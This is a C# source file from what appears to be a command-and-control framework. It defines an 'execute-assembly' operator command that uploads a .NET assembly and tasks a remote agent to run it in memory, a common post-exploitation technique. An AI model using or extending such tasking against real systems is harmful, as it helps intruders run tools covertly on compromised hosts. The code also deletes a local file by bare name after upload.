using Commander.Executor;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Agent.Execute_Assembly
{
    public class ExecuteAssemblyCommandOptions
    {
        public string dotnetfile { get; set; }

        public string parameters { get; set; }
    }
    public class ExecuteAssemblyCommand : EnhancedCommand<ExecuteAssemblyCommandOptions>
    {
        public override string Category => CommandCategory.Core;
        public override string Description => "Execute a dot net assembly in memory";
        public override string Name => EndPointCommand.EXECUTEASSEMBLY;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("dotnetfile", "path of the file to execute"),
                new Argument<string>("parameters", () => "", "parameters to pass"),
            };

        protected override async Task<bool> HandleCommand(CommandContext<ExecuteAssemblyCommandOptions> context)
        {
            if(!File.Exists(context.Options.dotnetfile))
            {
                context.Terminal.WriteError($"File {context.Options.dotnetfile} not found");
                return false;
            }
            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(context.Options.dotnetfile))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            string fileName = Path.GetFileName(context.Options.dotnetfile);
            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, Path.GetFileName(fileName), a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });

            File.Delete(fileName);

            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, this.Name, fileId, fileName, context.Options.parameters);
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
            return true;
        }
    }
}

